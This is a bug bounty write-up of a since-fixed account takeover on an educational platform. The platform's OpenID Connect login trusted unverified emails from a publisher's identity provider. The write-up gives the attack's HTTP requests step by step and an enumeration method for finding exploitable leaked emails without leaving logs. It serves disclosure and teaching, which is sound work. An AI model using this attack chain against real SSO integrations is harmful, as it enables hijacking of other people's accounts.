---
title: 'Zero-Click Account Takeover: Stealing User Accounts Through Alternative Login (IdP Confusion)'
summary: 'An email verification flaw in the SSO (OpenID Connect) integration between an educational platform and a publisher''s identity provider allowed full takeover of any account, with no password, no token and no interaction from the victim.'
pubDate: 2026-09-21
tags: ['Bug Bounty', 'Web', 'SSO', 'OAuth', 'Account Takeover']
platform: 'Intigriti'
severity: 'Critical'
reward: '€700'
cover: '../../../assets/writeups/002/idp-confusion-cover.jpg'
coverAlt: 'Diagram of the IdP Confusion flow leading to account takeover'
draft: false
---

What's up, hackers!

In this write-up I'll show how an email verification flaw in the SSO (OpenID Connect) integration between an online dictionary and educational content platform and the federated identity provider it used, a large textbook publisher, allowed the full takeover of any account whose email the attacker knew. No victim password, no stolen token, no interaction from them. Zero click, zero notification, zero trace.

## One fine day

I was looking through a few private bug bounty programs and noticed one that, ever since I got the invite, I had never reported anything to. Except this same program had already paid out more than €100k in bugs from other researchers. I looked at that number and thought: if it's paying all that, there are good targets in there, I (and my hackbot) just need to give it the attention it deserves.

I went to analyze the in-scope assets and found a subsidiary with some very interesting flows. In fact, my hackbot had already found some things there before, which reinforced the impression that it was an interesting target. So I decided to focus on the basics (what I like most): analyzing the login and registration flow of that subsidiary.

Right on the login screen, before even trying anything more elaborate, I noticed a button that always catches my attention when I'm on a target: "Sign in with Service X". The platform in question was an online dictionary and educational content service, and the button pointed to a federated identity provider (IdP) that belonged to the publisher itself, the owner of the program. In other words, that wasn't just another convenience option for the user: it was a trust point between two different applications, and points like these rarely get the same level of attention as the main login flow. So, let's go.

## The alternative login

Every platform that offers "Sign in with Service X" catches my attention, because this type of integration tends to hide assumptions that nobody validates or revalidates in production. In this case, the platform offered login via a federated identity provider (IdP) belonging to its partner publisher. Instead of creating their own account and password, the user authenticated over there and came back already logged in.

So I followed the happy path, not expecting anything yet:

```
GET /user/authenticate/redacted-idp HTTP/2
Host: www.redacted.com
Accept: text/html
```

```
HTTP/2 302 Found
Location: https://id.redacted-idp.com/oxauth/restv1/authorize?client_id=CLIENT_ID_REDACTED&scope=openid%20email%20profile&redirect_uri=https%3A%2F%2Fwww.redacted.com%2Fopenid-connect%2Fredacted-idp
```

Login on the IdP, one click, and the browser returns to `www.redacted.com/redacted-idp-login-redirect#id_token=<token>` already authenticated on the platform. So far, nothing wrong, that's how OIDC should work. But two things caught my attention: no consent screen and no "link this account?" step before landing authenticated. That's not necessarily a flaw, but it's the kind of detail that makes me want to open the token, understand the integration and see exactly what's being passed between the environments.

## Analyzing the token

I decoded the `id_token` issued by the IdP (`id.redacted-idp.com`) for this client:

```json
{
  "iss": "https://id.redacted-idp.com",
  "sub": "a1b2c3d4-0000-1111-2222-333344445555",
  "name": "User",
  "email": "user@gmail.com"
}
```

Notice there's no `email_verified` field at all. And okay, it's perfectly possible that the application doesn't even use that claim, or that the IdP guarantees verification at some other point in the flow. But it raises the question: if that field doesn't exist, does the platform have any way to know whether that email was actually proven before deciding which local account to authenticate you into?

I tested the behavior in practice, but in a way that isolated that verified-email variable: registering an email I controlled and knew didn't belong to any local account yet, versus an email I knew belonged to an existing account on the platform (via native sign-up). The result confirmed the suspicion: the platform resolves the local account solely by the value of the email coming from the token. If it finds a match, it authenticates you right into it, no further checks.

In other words, the decision of "this person owns this account" is entirely delegated to the value of a text field that the IdP itself lets me fill in. And that only becomes a real problem if I can get the IdP to issue an `id_token` with someone else's email. Okay, let's try to exploit that.

## Understanding the alternative login flow

If the platform blindly trusts the email the IdP hands it, the next question is obvious: does the IdP's sign-up guarantee that email actually belongs to whoever is registering?

I created a test account in the IdP's sign-up flow and paid attention to every API response:

### Account Validation

```
POST /v1/registration/teacher/login-credentials HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"email":"user@gmail.com","password":"StrongPass123!","userName":"user"}
```

```
HTTP/2 200 OK
Content-Type: application/json

{"successType":"NEW_TEACHER"}
```

No cookie, no CSRF token, no CAPTCHA. An anonymous call already creates the credentials. I followed the flow through to the end:

### Address Validation

```
POST /v1/address/validation HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"city":"São Paulo","countryId":"BR","street":"Rua Six da Seven","streetNumber":"123","zipCode":"01000-000"}
```

```
HTTP/2 200 OK

{"validationResult":"VALID","suggestion":null}
```

### Account Creation

```
POST /v1/registration/teacher HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"salutation":"SR","city":"Xique Xique","countryId":"BR","email":"user@example.com",
 "firstName":"User","lastName":"da Silva","password":"StrongPass123!",
 "street":"Rua Six da Seven","streetNumber":"67","userName":"user","zipCode":"01234-000"}
```

```
HTTP/2 200 OK

{"successType":"NEW_TEACHER","accountNumber":"9988646769"}
```

And here came the confirmation I was looking for: the account already authenticated normally on the IdP before I had even opened my inbox. The "confirmation" email that arrived had no activation link at all, just a username and marketing links. Nothing blocked login until I clicked on something.

At that moment the two pieces fit together: the IdP issues a complete identity without proving ownership of the email, and the platform consumes that identity trusting the received email blindly. On their own, each behavior is debatable. Together, they form a complete account takeover chain: I just had to register on the IdP using anyone's email, and the platform would authenticate me as that person.

## Comparing with the platform's happy path

Before building the final PoC, I wanted to confirm one thing: was this a consciously accepted risk, or simply a control that existed elsewhere and wasn't replicated here? So I went to check the platform's own native sign-up, without going through the IdP:

```
POST /api/v1/users HTTP/2
Host: www.redacted.com
Content-Type: application/json

{"email":"user2@gmail.com","givenName":"User","familyName":" Victim","pass":"StrongPass123!","source":"redacted"}
```

```
HTTP/2 200 OK
Content-Type: application/json

{"status":true}
```

And indeed: the platform fires off an email with a unique verification link (`/user/register/verification/{hash}`) that has to be visited before the account works. In other words, the email-ownership control already exists in the product, it was just implemented exclusively in the native sign-up, and never replicated on the SSO path. It wasn't an architecture decision. It was a gap in an alternative path to the same destination.

With the gap confirmed on both sides, all that was left was the end-to-end proof of impact.

## Building the attack

The prerequisite is simple: the victim has a registered and confirmed account on the platform (via native sign-up), with an email the attacker knows. Quite plausible considering third-party breaches, corporate email signatures, or predictable institutional email patterns.

I used the "victim" test account created in the previous step as the target. Before trying to register on the IdP with their email, it's worth noting that this same `login-credentials` call I used to investigate the behavior also works as an enumeration primitive: `NEW_TEACHER` confirms the email hasn't been claimed on the IdP yet, i.e. an attackable target; `{"errorCode":"EMAIL_ALREADY_EXISTS"}` rules the target out. This lets you sweep an entire list of leaked emails and know exactly which accounts are exploitable, without ever generating a single log on the target platform.

With the target confirmed as viable, I repeated the full sign-up on the IdP using the victim's email and a fictitious name of mine:

```
POST /v1/registration/teacher HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"salutation":"SR","city":"Xique Xique","countryId":"BR","email":"user2@gmail.com",
 "firstName":"Luq","lastName":"ATO PoC","password":"AnotherPass456!",
 "street":"Rua Six Seven da Silva","streetNumber":"123","userName":"luq-ato","zipCode":"01000-000"}
```

```
HTTP/2 200 OK

{"successType":"NEW_TEACHER","accountNumber":"1122334455"}
```

I logged into the IdP with this freshly created account and, in the same browser session, went back to the platform's "side door":

```
GET /user/authenticate/redacted-idp HTTP/2
Host: www.redacted.com
Accept: text/html
Cookie: ATTACKER_IDP_SESSION=eyJhbGciOi...
```

The OIDC flow runs normally, comes back to the redirect with `id_token`, and lands authenticated at `/user`. The token decodes to:

```json
{
  "iss": "https://id.redacted-idp.com",
  "sub": "f6e5d4c3-9999-8888-7777-666655554444",
  "name": "Luq ATO PoC",
  "email": "user2@gmail.com"
}
```

The `name` is what I, the attacker, registered. The `email` is the victim's, and it's the only field the platform trusts to decide which account to authenticate. The proof of impact came from reading the profile of the freshly opened session:

```
GET /api/v1/users/current HTTP/2
Host: www.redacted.com
Application-Authorization: Bearer ATTACKER_TOKEN_EXAMPLE
X-Token-Provider: redacted-idp
Accept: application/json
```

I expected to receive the new account, with the fictitious name I had just registered. Instead I got this:

```
HTTP/2 200 OK
Content-Type: application/json

{
  "id": "scim-victim-000111222",
  "name": {"familyName":"Victim","givenName":"User"},
  "displayName": "User Victim",
  "userEmail": "user2@gmail.com",
  "roles": ["authenticated","redacted_basic"]
}
```

The session landed straight into the victim's account, created before my identity even existed on the IdP. The returned name was never provided by me.

## Result

With the session authenticated as the victim, the access reached:

- Reading full name, email, internal UID, SCIM ID and account roles;
- Writing to the victim's profile via `PATCH /api/v1/users/current`, with the server confirming their UID in the response;
- The change-password, delete-account, payment-data and invoices sections, including the internal customer and contract endpoints;
- Mass target pre-selection, fully anonymously, via `NEW_TEACHER` vs `EMAIL_ALREADY_EXISTS`;
- And the most uncomfortable detail: the victim gets no notification whatsoever, loses no access, keeps logging in normally with their own password. There's no trace that the account was accessed.

For any paying subscriber of that platform whose email leaked in some third-party breach, was published in a corporate email signature, or simply follows the predictable `first.last@company.com` pattern, the account was three anonymous HTTP requests away from being taken over.

## Lessons learned

1. **Identity federation isn't "just trust it and done".** Each side of the bridge (IdP and Service Provider) has to enforce ownership verification of the joining identifier, in this case the email. One of the two skipping that step is enough to turn it into ATO.

2. **Compare the "official" flow with the "alternative" flow.** The platform already had the right control in the native sign-up. The question always worth asking is whether that same control exists on every path that leads to the same place.

## Timeline

- Reported: `2026-09-15`
- Triaged: `2026-09-17`
- Fixed/Confirmed: `2026-09-18`
- Severity: `Exceptional`

Keep Hacking!

![Bounty proof](../../../assets/writeups/002/bounty-proof.png)
